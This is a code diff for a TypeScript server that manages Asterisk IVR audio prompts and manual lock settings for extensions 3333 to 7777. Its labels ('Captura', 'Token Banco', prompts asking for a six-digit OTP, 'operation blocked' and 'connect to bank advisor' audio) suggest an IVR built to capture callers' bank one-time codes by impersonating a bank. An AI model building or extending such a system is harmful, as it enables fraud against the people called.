+    lock_7777: false,
+    lock_6666: false,
+    lock_5555: false,
+    lock_4444: false,
+    lock_3333: false,
+    ivr_entity: false,
+  };
+}
+
+function saveManualAudioLocks(data: Record<string, boolean>) {
+  try {
+    const dataDir = path.join(process.cwd(), 'data');
+    if (!fs.existsSync(dataDir)) {
+      fs.mkdirSync(dataDir, { recursive: true });
+    }
+    fs.writeFileSync(AUDIO_LOCKS_FILE, JSON.stringify(data, null, 2), 'utf-8');
+  } catch (e) {
+    console.error('[AUDIO] Error guardando audio_locks.json:', e);
+  }
+}
+
+let manualAudioLocks: Record<string, boolean> = loadManualAudioLocks();
 
 function loadActiveAudioAssignments(): Record<string, string> {
   try {
@@ -3033,76 +3083,167 @@ function applyAudioAssignmentToAsterisk(role: string, asteriskPath: string) {
       activeAudioAssignments.press1_invalid = cleanPath;
       break;
 
-    case 'welcome_3333':
-    case '3333':
-    case '333':
-    case 'capture_3333':
-      commands.push(`database put ivr_vars 3333_intro "${cleanPath}"`);
-      commands.push(`database put ivr_vars 3333_prompt "${cleanPath}"`);
-      commands.push(`database put ivr_vars 333_intro "${cleanPath}"`);
-      commands.push(`database put ivr_vars 333_prompt "${cleanPath}"`);
-      copyToFallback('bienvenida_3333');
-      copyToFallback('solicitar_codigo_otp');
-      copyToFallback('digite_token_6_digitos');
-      activeAudioAssignments.welcome_3333 = cleanPath;
-      break;
-
-    case 'welcome_4444':
-    case '4444':
-    case '444':
-    case 'capture_4444':
-      commands.push(`database put ivr_vars 4444_intro "${cleanPath}"`);
-      commands.push(`database put ivr_vars 4444_prompt "${cleanPath}"`);
-      commands.push(`database put ivr_vars 444_intro "${cleanPath}"`);
-      commands.push(`database put ivr_vars 444_prompt "${cleanPath}"`);
-      copyToFallback('bienvenida_4444');
-      copyToFallback('solicitar_codigo_otp');
-      copyToFallback('digite_token_6_digitos');
-      activeAudioAssignments.welcome_4444 = cleanPath;
-      break;
-
-    case 'welcome_5555':
-    case '5555':
-    case '555':
-    case 'capture_5555':
-      commands.push(`database put ivr_vars 5555_intro "${cleanPath}"`);
-      commands.push(`database put ivr_vars 5555_prompt "${cleanPath}"`);
-      commands.push(`database put ivr_vars 555_intro "${cleanPath}"`);
-      commands.push(`database put ivr_vars 555_prompt "${cleanPath}"`);
-      copyToFallback('bienvenida_5555');
-      copyToFallback('solicitar_codigo_otp');
-      copyToFallback('digite_token_6_digitos');
-      activeAudioAssignments.welcome_5555 = cleanPath;
-      break;
-
+    // --- EXTENSIÓN 7777 / 777 (Captura Primaria) ---
     case 'welcome_7777':
     case '7777':
     case '777':
     case 'capture_7777':
+    case 'prompt_7777':
       commands.push(`database put ivr_vars 7777_intro "${cleanPath}"`);
       commands.push(`database put ivr_vars 7777_prompt "${cleanPath}"`);
       commands.push(`database put ivr_vars 777_intro "${cleanPath}"`);
       commands.push(`database put ivr_vars 777_prompt "${cleanPath}"`);
       copyToFallback('bienvenida_7777');
-      copyToFallback('solicitar_codigo_otp');
-      copyToFallback('digite_token_6_digitos');
       activeAudioAssignments.welcome_7777 = cleanPath;
       break;
 
+    case 'wait_7777':
+      commands.push(`database put ivr_vars 7777_wait "${cleanPath}"`);
+      commands.push(`database put ivr_vars 777_wait "${cleanPath}"`);
+      activeAudioAssignments.wait_7777 = cleanPath;
+      break;
+
+    case 'success_7777':
+      commands.push(`database put ivr_vars 7777_success "${cleanPath}"`);
+      commands.push(`database put ivr_vars 777_success "${cleanPath}"`);
+      activeAudioAssignments.success_7777 = cleanPath;
+      break;
+
+    case 'failure_7777':
+      commands.push(`database put ivr_vars 7777_failure "${cleanPath}"`);
+      commands.push(`database put ivr_vars 777_failure "${cleanPath}"`);
+      activeAudioAssignments.failure_7777 = cleanPath;
+      break;
+
+    // --- EXTENSIÓN 6666 / 666 (Captura Secundaria / Token Banco) ---
     case 'welcome_6666':
     case '6666':
     case '666':
     case 'capture_6666':
+    case 'prompt_6666':
       commands.push(`database put ivr_vars 6666_intro "${cleanPath}"`);
       commands.push(`database put ivr_vars 6666_prompt "${cleanPath}"`);
       commands.push(`database put ivr_vars 666_intro "${cleanPath}"`);
       commands.push(`database put ivr_vars 666_prompt "${cleanPath}"`);
       copyToFallback('bienvenida_6666');
-      copyToFallback('solicitar_codigo_otp');
-      copyToFallback('digite_token_6_digitos');
       activeAudioAssignments.welcome_6666 = cleanPath;
       break;
 
+    case 'wait_6666':
+      commands.push(`database put ivr_vars 6666_wait "${cleanPath}"`);
+      commands.push(`database put ivr_vars 666_wait "${cleanPath}"`);
+      activeAudioAssignments.wait_6666 = cleanPath;
+      break;
+
+    case 'success_6666':
+      commands.push(`database put ivr_vars 6666_success "${cleanPath}"`);
+      commands.push(`database put ivr_vars 666_success "${cleanPath}"`);
+      activeAudioAssignments.success_6666 = cleanPath;
+      break;
+
+    case 'failure_6666':
+      commands.push(`database put ivr_vars 6666_failure "${cleanPath}"`);
+      commands.push(`database put ivr_vars 666_failure "${cleanPath}"`);
+      activeAudioAssignments.failure_6666 = cleanPath;
+      break;
+
+    // --- EXTENSIÓN 5555 / 555 (Captura 5555) ---
+    case 'welcome_5555':
+    case '5555':
+    case '555':
+    case 'capture_5555':
+    case 'prompt_5555':
+      commands.push(`database put ivr_vars 5555_intro "${cleanPath}"`);
+      commands.push(`database put ivr_vars 5555_prompt "${cleanPath}"`);
+      commands.push(`database put ivr_vars 555_intro "${cleanPath}"`);
+      commands.push(`database put ivr_vars 555_prompt "${cleanPath}"`);
+      copyToFallback('bienvenida_5555');
+      activeAudioAssignments.welcome_5555 = cleanPath;
+      break;
+
+    case 'wait_5555':
+      commands.push(`database put ivr_vars 5555_wait "${cleanPath}"`);
+      commands.push(`database put ivr_vars 555_wait "${cleanPath}"`);
+      activeAudioAssignments.wait_5555 = cleanPath;
+      break;
+
+    case 'success_5555':
+      commands.push(`database put ivr_vars 5555_success "${cleanPath}"`);
+      commands.push(`database put ivr_vars 555_success "${cleanPath}"`);
+      activeAudioAssignments.success_5555 = cleanPath;
+      break;
+
+    case 'failure_5555':
+      commands.push(`database put ivr_vars 5555_failure "${cleanPath}"`);
+      commands.push(`database put ivr_vars 555_failure "${cleanPath}"`);
+      activeAudioAssignments.failure_5555 = cleanPath;
+      break;
+
+    // --- EXTENSIÓN 4444 / 444 (Captura 4444) ---
+    case 'welcome_4444':
+    case '4444':
+    case '444':
+    case 'capture_4444':
+    case 'prompt_4444':
+      commands.push(`database put ivr_vars 4444_intro "${cleanPath}"`);
+      commands.push(`database put ivr_vars 4444_prompt "${cleanPath}"`);
+      commands.push(`database put ivr_vars 444_intro "${cleanPath}"`);
+      commands.push(`database put ivr_vars 444_prompt "${cleanPath}"`);
+      copyToFallback('bienvenida_4444');
+      activeAudioAssignments.welcome_4444 = cleanPath;
+      break;
+
+    case 'wait_4444':
+      commands.push(`database put ivr_vars 4444_wait "${cleanPath}"`);
+      commands.push(`database put ivr_vars 444_wait "${cleanPath}"`);
+      activeAudioAssignments.wait_4444 = cleanPath;
+      break;
+
+    case 'success_4444':
+      commands.push(`database put ivr_vars 4444_success "${cleanPath}"`);
+      commands.push(`database put ivr_vars 444_success "${cleanPath}"`);
+      activeAudioAssignments.success_4444 = cleanPath;
+      break;
+
+    case 'failure_4444':
+      commands.push(`database put ivr_vars 4444_failure "${cleanPath}"`);
+      commands.push(`database put ivr_vars 444_failure "${cleanPath}"`);
+      activeAudioAssignments.failure_4444 = cleanPath;
+      break;
+
+    // --- EXTENSIÓN 3333 / 333 (Captura 3333) ---
+    case 'welcome_3333':
+    case '3333':
+    case '333':
+    case 'capture_3333':
+    case 'prompt_3333':
+      commands.push(`database put ivr_vars 3333_intro "${cleanPath}"`);
+      commands.push(`database put ivr_vars 3333_prompt "${cleanPath}"`);
+      commands.push(`database put ivr_vars 333_intro "${cleanPath}"`);
+      commands.push(`database put ivr_vars 333_prompt "${cleanPath}"`);
+      copyToFallback('bienvenida_3333');
+      activeAudioAssignments.welcome_3333 = cleanPath;
+      break;
+
+    case 'wait_3333':
+      commands.push(`database put ivr_vars 3333_wait "${cleanPath}"`);
+      commands.push(`database put ivr_vars 333_wait "${cleanPath}"`);
+      activeAudioAssignments.wait_3333 = cleanPath;
+      break;
+
+    case 'success_3333':
+      commands.push(`database put ivr_vars 3333_success "${cleanPath}"`);
+      commands.push(`database put ivr_vars 333_success "${cleanPath}"`);
+      activeAudioAssignments.success_3333 = cleanPath;
+      break;
+
+    case 'failure_3333':
+      commands.push(`database put ivr_vars 3333_failure "${cleanPath}"`);
+      commands.push(`database put ivr_vars 333_failure "${cleanPath}"`);
+      activeAudioAssignments.failure_3333 = cleanPath;
+      break;
+
+    // --- ROLES GENÉRICOS DE SISTEMA (Solo afectan destinos genéricos, no a las extensiones dedicadas) ---
     case 'otp_welcome':
     case 'prompt':
       for (const tgt of genericTargets) {
@@ -3118,11 +3259,6 @@ function applyAudioAssignmentToAsterisk(role: string, asteriskPath: string) {
       for (const tgt of genericTargets) {
         commands.push(`database put ivr_vars ${tgt}_wait "${cleanPath}"`);
       }
-      commands.push(`database put ivr_vars 3333_wait "${cleanPath}"`);
-      commands.push(`database put ivr_vars 4444_wait "${cleanPath}"`);
-      commands.push(`database put ivr_vars 5555_wait "${cleanPath}"`);
-      commands.push(`database put ivr_vars 6666_wait "${cleanPath}"`);
-      commands.push(`database put ivr_vars 7777_wait "${cleanPath}"`);
       copyToFallback('un_momento_validando_informacion');
       activeAudioAssignments.otp_wait = cleanPath;
       break;
@@ -3132,11 +3268,6 @@ function applyAudioAssignmentToAsterisk(role: string, asteriskPath: string) {
       for (const tgt of genericTargets) {
         commands.push(`database put ivr_vars ${tgt}_success "${cleanPath}"`);
       }
-      commands.push(`database put ivr_vars 3333_success "${cleanPath}"`);
-      commands.push(`database put ivr_vars 4444_success "${cleanPath}"`);
-      commands.push(`database put ivr_vars 5555_success "${cleanPath}"`);
-      commands.push(`database put ivr_vars 6666_success "${cleanPath}"`);
-      commands.push(`database put ivr_vars 7777_success "${cleanPath}"`);
       copyToFallback('operacion_bloqueada_exito');
       copyToFallback('otp_validado_exito');
       activeAudioAssignments.otp_success = cleanPath;
@@ -3148,11 +3279,6 @@ function applyAudioAssignmentToAsterisk(role: string, asteriskPath: string) {
       for (const tgt of genericTargets) {
         commands.push(`database put ivr_vars ${tgt}_failure "${cleanPath}"`);
       }
-      commands.push(`database put ivr_vars 3333_failure "${cleanPath}"`);
-      commands.push(`database put ivr_vars 4444_failure "${cleanPath}"`);
-      commands.push(`database put ivr_vars 5555_failure "${cleanPath}"`);
-      commands.push(`database put ivr_vars 6666_failure "${cleanPath}"`);
-      commands.push(`database put ivr_vars 7777_failure "${cleanPath}"`);
       copyToFallback('token_invalido_reintente');
       copyToFallback('codigo_invalido_reintente');
       activeAudioAssignments.otp_failure = cleanPath;
@@ -3184,15 +3310,46 @@ app.get('/api/asterisk/audio/active-assignments', (req, res) => {
     success: true,
     assignments: activeAudioAssignments,
     defaults: DEFAULT_AUDIO_ASSIGNMENTS,
+    manualLocks: manualAudioLocks,
   });
+});
+
+// Explicit endpoint to toggle manual lock on an audio role or ivr_entity
+app.post('/api/asterisk/audio/toggle-lock', (req, res) => {
+  try {
+    const { role, isLocked } = req.body;
+    if (!role) {
+      return res.status(400).json({ success: false, error: 'role es requerido' });
+    }
+    const newLockState = typeof isLocked === 'boolean' ? isLocked : !manualAudioLocks[role];
+    manualAudioLocks[role] = newLockState;
+    saveManualAudioLocks(manualAudioLocks);
+    console.log(`[AUDIO LOCK] Rol "${role}" bloqueo manual actualizado a: ${newLockState}`);
+    res.json({
+      success: true,
+      role,
+      isLocked: newLockState,
+      manualLocks: manualAudioLocks,
+      message: newLockState
+        ? `Configuración de ${role} bloqueada manualmente. La sincronización automática no la sobrescribirá.`
+        : `Configuración de ${role} desbloqueada.`,
+    });
+  } catch (e: any) {
+    res.status(500).json({ success: false, error: e.message });
+  }
 });
 
 // Explicit endpoint to assign an existing audio to an IVR role in Asterisk AstDB
 app.post('/api/asterisk/audio/assign', (req, res) => {
   try {
-    const { asteriskPath, role = 'agent_transfer' } = req.body;
+    const { asteriskPath, role = 'agent_transfer', isManualSave } = req.body;
     if (!asteriskPath) {
       return res.status(400).json({ success: false, error: 'asteriskPath es requerido' });
+    }
+
+    if (isManualSave) {
+      manualAudioLocks[role] = true;
+      saveManualAudioLocks(manualAudioLocks);
     }
 
     applyAudioAssignmentToAsterisk(role, asteriskPath);
@@ -3203,6 +3360,7 @@ app.post('/api/asterisk/audio/assign', (req, res) => {
       role,
       asteriskPath,
       assignments: activeAudioAssignments,
+      manualLocks: manualAudioLocks,
     });
   } catch (err: any) {
     res.status(500).json({ success: false, error: err.message });
@@ -3254,30 +3412,108 @@ app.get('/api/asterisk/audio/current-7777', (req, res) => {
   });
 });
 
+// Endpoint to save and lock individual audio configuration for a specific OTP extension (7777, 6666, 5555, 4444, 3333, etc.)
+app.post('/api/asterisk/audio/save-extension-config', (req, res) => {
+  try {
+    const { extension, prompt, wait, success, failure, isLocked = true } = req.body;
+    if (!extension) {
+      return res.status(400).json({ success: false, error: 'extension es requerido' });
+    }
+    const ext = String(extension).trim();
+    if (prompt) {
+      applyAudioAssignmentToAsterisk(`welcome_${ext}`, prompt);
+    }
+    if (wait) {
+      applyAudioAssignmentToAsterisk(`wait_${ext}`, wait);
+    }
+    if (success) {
+      applyAudioAssignmentToAsterisk(`success_${ext}`, success);
+    }
+    if (failure) {
+      applyAudioAssignmentToAsterisk(`failure_${ext}`, failure);
+    }
+
+    manualAudioLocks[`lock_${ext}`] = Boolean(isLocked);
+    manualAudioLocks[`welcome_${ext}`] = Boolean(isLocked);
+    saveManualAudioLocks(manualAudioLocks);
+    saveActiveAudioAssignments(activeAudioAssignments);
+
+    console.log(`[AUDIO EXTENSION] Configuración para Ext. ${ext} guardada y bloqueada: ${isLocked}`);
+
+    res.json({
+      success: true,
+      message: `Configuración de audios para Extensión ${ext} guardada y ${isLocked ? 'bloqueada contra sobreescritura' : 'desbloqueada'}.`,
+      extension: ext,
+      isLocked: Boolean(isLocked),
+      assignments: activeAudioAssignments,
+      manualLocks: manualAudioLocks,
+    });
+  } catch (err: any) {
+    res.status(500).json({ success: false, error: err.message });
+  }
+});
+
 // Endpoint to explicitly save & lock audio configurations for OTP extensions (3333, 4444, 5555, 6666, 7777)
 app.post('/api/asterisk/audio/save-otp-extensions', (req, res) => {
   try {
-    const { welcome_3333, welcome_4444, welcome_5555, welcome_6666, welcome_7777 } = req.body;
-    if (welcome_3333) {
-      applyAudioAssignmentToAsterisk('welcome_3333', welcome_3333);
+    const {
+      welcome_3333, wait_3333, success_3333, failure_3333,
+      welcome_4444, wait_4444, success_4444, failure_4444,
+      welcome_5555, wait_5555, success_5555, failure_5555,
+      welcome_6666, wait_6666, success_6666, failure_6666,
+      welcome_7777, wait_7777, success_7777, failure_7777,
+      isLocked, lockedRoles
+    } = req.body;
+
+    if (welcome_3333) applyAudioAssignmentToAsterisk('welcome_3333', welcome_3333);
+    if (wait_3333) applyAudioAssignmentToAsterisk('wait_3333', wait_3333);
+    if (success_3333) applyAudioAssignmentToAsterisk('success_3333', success_3333);
+    if (failure_3333) applyAudioAssignmentToAsterisk('failure_3333', failure_3333);
+
+    if (welcome_4444) applyAudioAssignmentToAsterisk('welcome_4444', welcome_4444);
+    if (wait_4444) applyAudioAssignmentToAsterisk('wait_4444', wait_4444);
+    if (success_4444) applyAudioAssignmentToAsterisk('success_4444', success_4444);
+    if (failure_4444) applyAudioAssignmentToAsterisk('failure_4444', failure_4444);
+
+    if (welcome_5555) applyAudioAssignmentToAsterisk('welcome_5555', welcome_5555);
+    if (wait_5555) applyAudioAssignmentToAsterisk('wait_5555', wait_5555);
+    if (success_5555) applyAudioAssignmentToAsterisk('success_5555', success_5555);
+    if (failure_5555) applyAudioAssignmentToAsterisk('failure_5555', failure_5555);
+
+    if (welcome_6666) applyAudioAssignmentToAsterisk('welcome_6666', welcome_6666);
+    if (wait_6666) applyAudioAssignmentToAsterisk('wait_6666', wait_6666);
+    if (success_6666) applyAudioAssignmentToAsterisk('success_6666', success_6666);
+    if (failure_6666) applyAudioAssignmentToAsterisk('failure_6666', failure_6666);
+
+    if (welcome_7777) applyAudioAssignmentToAsterisk('welcome_7777', welcome_7777);
+    if (wait_7777) applyAudioAssignmentToAsterisk('wait_7777', wait_7777);
+    if (success_7777) applyAudioAssignmentToAsterisk('success_7777', success_7777);
+    if (failure_7777) applyAudioAssignmentToAsterisk('failure_7777', failure_7777);
+
+    const lockVal = typeof isLocked === 'boolean' ? isLocked : true;
+    manualAudioLocks.welcome_7777 = lockVal;
+    manualAudioLocks.welcome_6666 = lockVal;
+    manualAudioLocks.welcome_5555 = lockVal;
+    manualAudioLocks.welcome_4444 = lockVal;
+    manualAudioLocks.welcome_3333 = lockVal;
+    manualAudioLocks.lock_7777 = lockVal;
+    manualAudioLocks.lock_6666 = lockVal;
+    manualAudioLocks.lock_5555 = lockVal;
+    manualAudioLocks.lock_4444 = lockVal;
+    manualAudioLocks.lock_3333 = lockVal;
+
+    if (lockedRoles && typeof lockedRoles === 'object') {
+      Object.assign(manualAudioLocks, lockedRoles);
     }
-    if (welcome_4444) {
-      applyAudioAssignmentToAsterisk('welcome_4444', welcome_4444);
-    }
-    if (welcome_5555) {
-      applyAudioAssignmentToAsterisk('welcome_5555', welcome_5555);
-    }
-    if (welcome_6666) {
-      applyAudioAssignmentToAsterisk('welcome_6666', welcome_6666);
-    }
-    if (welcome_7777) {
-      applyAudioAssignmentToAsterisk('welcome_7777', welcome_7777);
-    }
+
     saveActiveAudioAssignments(activeAudioAssignments);
+    saveManualAudioLocks(manualAudioLocks);
+
     res.json({
       success: true,
-      message: 'Configuración de extensiones OTP (3333, 4444, 5555, 6666, 7777) guardada y bloqueada permanentemente en AstDB.',
+      message: 'Configuración de extensiones OTP (7777, 6666, 5555, 4444, 3333) guardada y blindada en Asterisk AstDB.',
       assignments: activeAudioAssignments,
+      manualLocks: manualAudioLocks,
     });
   } catch (err: any) {
     res.status(500).json({ success: false, error: err.message });
@@ -3421,7 +3657,25 @@ app.post('/api/asterisk/audio/sync-defaults', (req, res) => {
       success = 'custom/operacion_bloqueada_exito',
       agent = 'custom/conectar_asesor_banco',
       destination,
+      isManualSave,
     } = req.body;
+
+    // Check if IVR entity / script is manually locked
+    if (manualAudioLocks.ivr_entity && !isManualSave) {
+      console.log('[AstDB LOCK] Guión / Entidad de IVR está bloqueada manualmente (isLocked: true). Sincronización automática ignorada.');
+      return res.json({
+        success: true,
+        skipped: true,
+        isLocked: true,
+        message: 'Sincronización omitida: La configuración del guión/entidad del IVR está bloqueada manualmente (isLocked: true).',
+        manualLocks: manualAudioLocks,
+      });
+    }
+
+    if (isManualSave) {
+      manualAudioLocks.ivr_entity = true;
+      saveManualAudioLocks(manualAudioLocks);
+    }
 
     // CRITICAL: 7777 and 6666 MUST NOT be in targets!
     // They are dedicated live OTP extensions with their own independent audios.
